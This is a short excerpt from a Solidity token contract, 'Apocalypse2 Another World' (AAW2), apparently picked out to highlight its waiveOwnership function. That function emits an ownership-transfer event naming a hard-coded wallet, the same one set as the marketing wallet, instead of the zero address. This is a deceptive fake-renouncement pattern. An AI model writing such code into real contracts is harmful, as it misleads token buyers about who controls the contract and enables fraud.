...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x756715B80D5c38F59Bf267326593c52a76f38D26));
...
contract ApocalypseAnotherWorld2 is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Apocalypse2 Another World";
    string private _symbol = "AAW2";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x756715B80D5c38F59Bf267326593c52a76f38D26);
    address payable public teamWalletAddress = payable(0xE5cDFBC64F83c2bE5AC42B2337B9518181e46328);
